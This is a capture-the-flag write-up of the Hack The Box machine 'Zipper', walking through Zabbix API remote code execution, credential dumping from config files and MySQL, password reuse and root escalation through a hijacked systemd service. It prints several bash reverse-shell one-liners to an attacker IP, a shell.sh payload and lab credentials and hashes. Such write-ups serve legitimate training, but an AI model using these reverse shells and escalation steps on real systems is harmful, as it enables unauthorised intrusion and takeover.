+++
date = '2025-03-23T15:45:37-04:00'
draft = false
title = 'HtB Zipper'
tags = ['writeup', 'hackthebox', 'hard', 'linux']
hideToc = false
+++
![htb-zipper](/images/Zipper.png)

Zipper is a medium difficulty machine that highlights how privileged API access can be leveraged to gain RCE, and the risk of unauthenticated agent access. It also provides an interesting challenge in terms of overcoming command processing timeouts, and also highlights the dangers of not specifying absolute paths in privileged admin scripts/binaries.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/zipper]
└─$ nmap -T4 -p- -A 10.129.1.198  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-10 22:31 EDT
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
10050/tcp open  tcpwrapped
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
```

### Zabbix-Agent - 10050/tcp

Since nmap had no clue what was running on 10050/tcp, I probed the port using netcat to see if I could learn anything.

```sh
┌──(pl4stic㉿kali)-[~/htb/zipper]
└─$ nc zipper.htb 10050 -v
zipper.htb [10.129.1.198] 10050 (zabbix-agent) open
```

### Apache2 - 80/tcp

Checking out the web server on 80/tcp, appears to be a default installation of Apache2.

![zipper1](/images/zipper1.png)

I couldn't find anything with GoBuster in terms of directories or sub-domains. I wonder if our other exposed port could be a clue... let's try `/zabbix`.

![zipper2](/images/zipper2.png)

## Initial Access

### Zabbix - RCE with API JSON-RPC

![zipper3](/images/zipper3.png)

A possible username, `zapper`. Let's try it on the login screen with the same password.

![zipper4](/images/zipper4.png)

That's a new error... maybe the credentials are valid? Time to start searching for a known exploit on Google. I came across this one: [Zabbix RCE with API JSON-RPC](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Zabbix/zabbixRceExP.py).  I'll modify the username/password values and give it a shot.  Also, grab the `hostid` by running one of the scripts on a host.

```sh
┌──(pl4stic㉿kali)-[~/htb/zipper]
└─$ python2.7 zabbix-poc.py
[zabbix_cmd]>>:  id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)

[zabbix_cmd]>>:  hostname
308e0d2f0722
```

And let's stabilize the shell:

```sh
[zabbix_cmd]>>:  bash -c 'bash -i >& /dev/tcp/10.10.14.199/4444 0>&1'
```

### Shell as zabbix

Found some interesting files in `/etc/zabbix`

```sh
zabbix@308e0d2f0722:/etc/zabbix$ cat zabbix_server.conf

# This is a configuration file for Zabbix server daemon
# To get more information about Zabbix, visit http://www.zabbix.com

############ GENERAL PARAMETERS #################
[...snip...]
DBName=zabbixdb
DBUser=zabbix
DBPassword=f.YMeMd$pTbpY3-449
```

Okay, let's see if we can access the MySQL database.

```sh
zabbix@308e0d2f0722:/$ script -q /dev/null
script -q /dev/null
$ mysql -u zabbix -D zabbixdb -p
mysql -u zabbix -D zabbixdb -p
Enter password: f.YMeMd$pTbpY3-449

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 448
Server version: 5.7.23-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

```sql
mysql> SELECT * FROM users;
SELECT * FROM users;
+--------+--------+--------+---------------+----------------------------------+-----+-----------+------------+-------+---------+------+---------+----------------+--------------+---------------+---------------+
| userid | alias  | name   | surname       | passwd                           | url | autologin | autologout | lang  | refresh | type | theme   | attempt_failed | attempt_ip   | attempt_clock | rows_per_page |
+--------+--------+--------+---------------+----------------------------------+-----+-----------+------------+-------+---------+------+---------+----------------+--------------+---------------+---------------+
|      1 | Admin  | Zabbix | Administrator | 65e730e044402ef2e2f386a18ec03c72 |     |         1 |          0 | en_GB |      30 |    3 | default |              4 | 10.10.14.199 |    1741662252 |            50 |
|      2 | guest  |        |               | d41d8cd98f00b204e9800998ecf8427e |     |         1 |          0 | en_GB |      30 |    1 | default |              0 |              |             0 |            50 |
|      3 | zapper | zapper |               | 16a7af0e14037b567d7782c4ef1bdeda |     |         0 |          0 | en_GB |      30 |    3 | default |              0 |              |             0 |            50 |
+--------+--------+--------+---------------+----------------------------------+-----+-----------+------------+-------+---------+------+---------+----------------+--------------+---------------+---------------+
3 rows in set (0.00 sec)
```

### Zappix Agent API

Looks like we can use the SQL password to login as `Admin` on the Web GUI. And, it would appear from examining the "Configuration -> Hosts" section of the page, that our `Zipper` host has the ZBX agent installed and active.  Guess we need to get smart on the [Zappix Agent API](https://www.zabbix.com/documentation/3.4/en/manual/config/items/itemtypes/zabbix_agent)

We also know from our nmap scan the Zappix Agent is running on port 10050, referenced as well in this screenshot.

![zipper5](/images/zipper5.png)

Based on the API instructions, it seems like we can send out commands in this format:
`echo 'api command' | nc 172.17.0.1 10050`

```sh
$ echo "agent.hostname" | nc 172.17.0.1 10050
echo "agent.hostname" | nc 172.17.0.1 10050
ZBXDZipper
```

Let's get our reverse shell.

```sh
echo "system.run[bash -c 'bash -i >& /dev/tcp/10.10.14.199/5555 0>&1']" | nc 172.17.0.1 10050
```

This works, but the shell only stays open for a few seconds. Must be Zabbix closing the connection.  We can try using the `nohup` argument and background the command with `&`.

```sh
echo "system.run[bash -c 'nohup bash -i >& /dev/tcp/10.10.14.199/5555 0>&1 &']" | nc 172.17.0.1 10050
```

Finally, we're in and have a stable shell.

```sh
┌──(pl4stic㉿kali)-[~/htb/zipper]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.10.14.199] from (UNKNOWN) [10.129.143.244] 35476
bash: cannot set terminal process group (4592): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zipper:/$ whoami
whoami
zabbix
```

In the `/home/zapper/utils` directory, there's a script named `backup.sh`

```sh
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
echo $?
```

Looks like a password. Maybe we can switch users and finally read `user.txt`. Let's see if it works on `zapper`

```sh
$ su zapper
su zapper
Password: ZippityDoDah


              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[252] Packages Need To Be Updated
[>] Backups:
4.0K    /backups/zapper_backup-2025-03-11.7z
                                      

zapper@zipper:~/utils$
```

Don't forget to grab the `id_rsa` for zapper as well.

## Privilege Escalation

Let's transfer and run `linpeas.sh` on the system and see if we can find any easy PE routes.

### linpeas.sh

Some interesting finds on our enumeration:

```sh
╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
# m h  dom mon dow   command
*/30 * * * *     /bin/bash /home/zapper/utils/backup.sh &>/dev/null
```

```sh
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-
/etc/systemd/system/purge-backups.service
```

```sh
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                  
-rwsr-sr-x 1 root root 7.4K Sep  8  2018 /home/zapper/utils/zabbix-service (Unknown SUID binary!)
```

### purge-backups.service + zappix-service SUID

Looks like our `purge-backups` service calls a bash script from the `/root` directory. Maybe we can change the service to point to a script we create?

```sh
zapper@zipper:~$ cat /etc/systemd/system/purge-backups.service 
[Unit]
Description=Purge Backups (Script)
[Service]
ExecStart=/root/scripts/purge-backups.sh
[Install]
WantedBy=purge-backups.timer
```

I'll change the following line:
`ExecStart=/tmp/shell.sh`

Create `shell.sh`:

```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.199/4545 0>&1
```

Now restart the service:

```sh
zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: stop
zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: start
```

Grab `root.txt` and call it a day.